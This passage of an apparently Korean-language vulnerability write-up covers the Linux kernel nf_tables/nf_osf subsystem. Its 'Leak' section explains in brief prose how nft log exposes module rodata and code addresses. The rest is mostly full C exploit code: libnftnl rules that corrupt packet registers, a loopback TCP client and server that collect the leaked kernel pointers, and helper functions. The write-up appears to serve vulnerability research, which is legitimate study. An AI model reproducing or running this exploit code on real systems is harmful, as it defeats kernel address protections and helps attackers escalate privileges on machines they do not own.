</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (ctx<span style="color:#f92672">-&gt;</span>totlen <span style="color:#f92672">!=</span> f<span style="color:#f92672">-&gt;</span>ss <span style="color:#f92672">||</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">nf_osf_ttl</span>(skb, ttl_check, f<span style="color:#f92672">-&gt;</span>ttl))
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">/*
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	 * Should not happen if userspace parser was written correctly.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	 */</span>
</span></span></code></pre></div><p>find안에서 호출하는데, 이때 이부분을 잘 조작해서 무조건 false 리턴하게해서 넘어가면 된다.</p>
<h2 id="leak">Leak<a hidden class="anchor" aria-hidden="true" href="#leak">#</a></h2>
<p>nft log를 호출해서 모듈의 rodata section 부분을 가져올 수 있고, 코드 영역도 구할 수 있다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#75715e">#define _GNU_SOURCE
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;time.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stddef.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;utils.h&#34;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/netfilter/nf_tables.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/netfilter/nfnetlink.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define SIZE 0x800
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">// static struct nftnl_rule *isolate_pkt(uint8_t family, const char *table, const char *chain, const char * target_chain)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// {
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// 	struct nftnl_rule *r = NULL;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// 	uint16_t port = 8888;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// 	r = nftnl_rule_alloc();
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// 	if (r == NULL) {
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// 		perror(&#34;OOM&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// 		exit(EXIT_FAILURE);
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// 	}
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	
</span></span><span style="display:flex;"><span><span style="color:#75715e">// 	nftnl_rule_set_str(r, NFTNL_RULE_TABLE, table);
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// 	nftnl_rule_set_str(r, NFTNL_RULE_CHAIN, chain);
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// 	nftnl_rule_set_u32(r, NFTNL_RULE_FAMILY, family);
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// 	add_payload(r, NFT_PAYLOAD_TRANSPORT_HEADER, 0, NFT_REG_1, 13,1); // 0x18 -&gt; PSH ACK
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// 	add_cmp(r,NFT_REG_1, NFT_CMP_EQ, &#34;\x18&#34;,1);
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// 	add_verdict(r, NFT_JUMP, target_chain, NFT_REG_VERDICT);
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//   // TODO
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// 	return r;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// }
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">struct</span> nftnl_rule <span style="color:#f92672">*</span><span style="color:#a6e22e">edit_pkt_data</span>(<span style="color:#66d9ef">uint8_t</span> family, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>table, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>chain)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> nftnl_rule <span style="color:#f92672">*</span>r <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> <span style="color:#a6e22e">nftnl_rule_alloc</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (r <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;OOM&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// enum nft_payload_bases {
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">//     NFT_PAYLOAD_LL_HEADER,
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">//     NFT_PAYLOAD_NETWORK_HEADER,
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">//     NFT_PAYLOAD_TRANSPORT_HEADER,
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// };
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">nftnl_rule_set_str</span>(r, NFTNL_RULE_TABLE, table);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">nftnl_rule_set_str</span>(r, NFTNL_RULE_CHAIN, chain);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">nftnl_rule_set_u32</span>(r, NFTNL_RULE_FAMILY, family);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">add_payload</span>(r, NFT_PAYLOAD_TRANSPORT_HEADER, <span style="color:#ae81ff">0</span>, NFT_REG32_08, <span style="color:#ae81ff">13</span>,<span style="color:#ae81ff">4</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">add_cmp</span>(r, NFT_REG32_08, NFT_CMP_EQ, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x18</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov_imm</span>(r, NFT_REG_4,<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x02</span><span style="color:#e6db74">&#34;</span>,<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// add_bitwise(r, 0x2); // 2
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// add_payload(r, NFT_PAYLOAD_NETWORK_HEADER, NFT_REG_1, 0, 2,2); // total len corrupt
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">add_payload</span>(r, NFT_PAYLOAD_TRANSPORT_HEADER, NFT_REG_4, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">13</span>,<span style="color:#ae81ff">1</span>); 
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// add_cmp(r,NFT_REG_3,NFT_CMP_NEQ, &#34;\xff&#34;,1); // NO CRASH BUT NOT LEAKED
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">add_log</span>(r); <span style="color:#75715e">// LEAK
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// add_range(r);
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">add_osf</span>(r, NFT_REG_1, <span style="color:#ae81ff">0</span>, NFT_OSF_F_VERSION); 
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">add_payload</span>(r, NFT_PAYLOAD_TRANSPORT_HEADER, NFT_REG_1, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x28</span>,<span style="color:#ae81ff">0x10</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">add_payload</span>(r, NFT_PAYLOAD_TRANSPORT_HEADER, NFT_REG32_08, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">13</span>,<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// TODO
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">return</span> r;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">install_rule_for_leak</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// if(create_rule(isolate_pkt(NFPROTO_IPV4, &#34;filter&#34;, &#34;input&#34;, &#34;leak&#34;)) == 0 ){
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// 	perror(&#34;error creating rule&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// 	exit(EXIT_FAILURE);
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// }
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// if(create_rule(edit_pkt_data(NFPROTO_IPV4, &#34;filter&#34;, &#34;leak&#34;)) == 0 ){
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// 	perror(&#34;error creating rule&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// 	exit(EXIT_FAILURE);
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// }
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">create_rule</span>(<span style="color:#a6e22e">edit_pkt_data</span>(NFPROTO_IPV4, <span style="color:#e6db74">&#34;filter&#34;</span>, <span style="color:#e6db74">&#34;input&#34;</span>)) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> ){
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;error creating rule&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">exit</span>(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">client</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span> data){
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> sockfd;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> sockaddr_in server_addr;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> buf <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(<span style="color:#ae81ff">0x200</span>);
</span></span><span style="display:flex;"><span>    sockfd <span style="color:#f92672">=</span> <span style="color:#a6e22e">socket</span>(AF_INET, SOCK_STREAM, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (sockfd <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;socket&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    server_addr.sin_family <span style="color:#f92672">=</span> AF_INET;
</span></span><span style="display:flex;"><span>    server_addr.sin_port <span style="color:#f92672">=</span> <span style="color:#a6e22e">htons</span>(<span style="color:#ae81ff">8888</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">inet_pton</span>(AF_INET, <span style="color:#e6db74">&#34;127.0.0.1&#34;</span>, <span style="color:#f92672">&amp;</span>(server_addr.sin_addr));
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">connect</span>(sockfd, (<span style="color:#66d9ef">struct</span> sockaddr <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>server_addr, <span style="color:#66d9ef">sizeof</span>((server_addr))) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>    	<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;connect&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">close</span>(sockfd);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;i<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">4</span>;i<span style="color:#f92672">++</span>){
</span></span><span style="display:flex;"><span>	    <span style="color:#66d9ef">int</span> res <span style="color:#f92672">=</span> <span style="color:#a6e22e">write</span>(sockfd, data, SIZE);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">close</span>(sockfd);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">server</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>buf) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> sockaddr_in server_addr;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">socklen_t</span> server_addr_len;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> sockaddr_in client_addr;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">socklen_t</span> client_addr_len;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> tmp[<span style="color:#ae81ff">0x200</span>];
</span></span><span style="display:flex;"><span>    client_addr_len <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(client_addr);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">socket</span>(AF_INET, SOCK_STREAM, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (fd <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;socket&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    server_addr.sin_family <span style="color:#f92672">=</span> AF_INET;
</span></span><span style="display:flex;"><span>    server_addr.sin_port <span style="color:#f92672">=</span> <span style="color:#a6e22e">htons</span>(<span style="color:#ae81ff">8888</span>);
</span></span><span style="display:flex;"><span>    server_addr.sin_addr.s_addr <span style="color:#f92672">=</span> <span style="color:#a6e22e">htonl</span>(INADDR_ANY);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">bind</span>(fd, (<span style="color:#66d9ef">struct</span> sockaddr <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>server_addr, <span style="color:#66d9ef">sizeof</span>(server_addr)) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;bind&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">close</span>(fd);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">listen</span>(fd, <span style="color:#ae81ff">50</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;listen&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">close</span>(fd);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> cl_sock <span style="color:#f92672">=</span> <span style="color:#a6e22e">accept</span>(fd, (<span style="color:#66d9ef">struct</span> sockaddr <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>client_addr, <span style="color:#f92672">&amp;</span>client_addr_len);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (cl_sock <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>){
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;accept&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">close</span>(fd);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">exit</span>(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;i<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">4</span>;i<span style="color:#f92672">++</span>){
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">read</span>(cl_sock, buf, SIZE);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">hexdump</span>(buf,<span style="color:#ae81ff">0x20</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">uint64_t</span> leak <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span> )((<span style="color:#66d9ef">uint64_t</span>)buf <span style="color:#f92672">+</span> <span style="color:#ae81ff">9</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Leaked : 0x%lx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, leak);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">close</span>(cl_sock); <span style="color:#75715e">// Close client socket
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">close</span>(fd);      <span style="color:#75715e">// Close server socket
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>argv[])
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> tid, status;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">pthread_t</span> p_thread;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> udpbuf[<span style="color:#ae81ff">512</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>,};
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">uint64_t</span> kernel_base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(udpbuf, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">512</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">new_ns</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;ip link set lo up&#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span> buf <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(<span style="color:#ae81ff">0x200</span>);
</span></span><span style="display:flex;"><span>    tid <span style="color:#f92672">=</span> <span style="color:#a6e22e">pthread_create</span>(<span style="color:#f92672">&amp;</span>p_thread, NULL, server, buf);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (tid <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>){
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;thread create error : &#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">create_table</span>(NFPROTO_IPV4, <span style="color:#e6db74">&#34;filter&#34;</span>, false) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>){
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;error creating table&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">exit</span>(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">create_chain</span>(<span style="color:#e6db74">&#34;filter&#34;</span>, <span style="color:#e6db74">&#34;input&#34;</span>, NF_INET_LOCAL_IN) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>){
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;error creating chain&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">exit</span>(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">create_chain</span>(<span style="color:#e6db74">&#34;filter&#34;</span>, <span style="color:#e6db74">&#34;leak&#34;</span>, <span style="color:#ae81ff">0</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>){
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;error creating chain&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">exit</span>(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">install_rule_for_leak</span>();
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] send &amp; recv tcp packet</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">usleep</span>(<span style="color:#ae81ff">1000</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">client</span>(udpbuf);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;netinet/in.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;netinet/ip.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;netinet/tcp.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;arpa/inet.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/socket.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;errno.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;pthread.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;fcntl.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sched.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/ioctl.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;ctype.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/netfilter.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/netfilter/nfnetlink.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/netfilter/nf_tables.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;libmnl/libmnl.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;libnftnl/rule.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;libnftnl/expr.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;libnftnl/table.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;libnftnl/chain.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;libnftnl/rule.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">add_log</span>(<span style="color:#66d9ef">struct</span> nftnl_rule <span style="color:#f92672">*</span>r){
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> nftnl_expr <span style="color:#f92672">*</span> expr <span style="color:#f92672">=</span> <span style="color:#a6e22e">nftnl_expr_alloc</span>(<span style="color:#e6db74">&#34;log&#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_expr_set_u32</span>(expr, NFTNL_EXPR_LOG_GROUP, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">nftnl_expr_set_u32</span>(expr, NFTNL_EXPR_LOG_PREFIX, <span style="color:#e6db74">&#34;Packet logged: &#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">nftnl_expr_set_u32</span>(expr, NFTNL_EXPR_LOG_SNAPLEN, <span style="color:#ae81ff">128</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">nftnl_rule_add_expr</span>(r, expr);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">add_range</span>(<span style="color:#66d9ef">struct</span> nftnl_rule <span style="color:#f92672">*</span>r){
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> nftnl_expr <span style="color:#f92672">*</span> expr <span style="color:#f92672">=</span> <span style="color:#a6e22e">nftnl_expr_alloc</span>(<span style="color:#e6db74">&#34;range&#34;</span>);
